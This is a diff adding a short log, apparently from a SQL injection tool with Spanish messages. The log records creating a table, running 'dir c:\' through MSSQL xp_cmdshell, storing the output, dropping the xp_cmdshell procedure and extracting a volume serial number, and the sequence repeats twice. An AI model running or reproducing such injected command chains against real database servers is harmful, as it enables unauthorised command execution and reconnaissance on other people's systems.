@@ -1,0 +1,6 @@
+COMM:   Se creo la tabla: [[x_5031]].
+COMM:   Se ejecuto el comando shell: [ 'dir c:\';insert into [x_5031] values ('g_over');exec master.dbo.sp_dropextendedproc 'xp_cmdshell].
+EXTR:   _volume_serial_number_is_24ca-c152|.
+COMM:   Se creo la tabla: [[x_5031]].
+COMM:   Se ejecuto el comando shell: [ 'dir c:\';insert into [x_5031] values ('g_over');exec master.dbo.sp_dropextendedproc 'xp_cmdshell].
+EXTR:   _volume_serial_number_is_24ca-c152|.
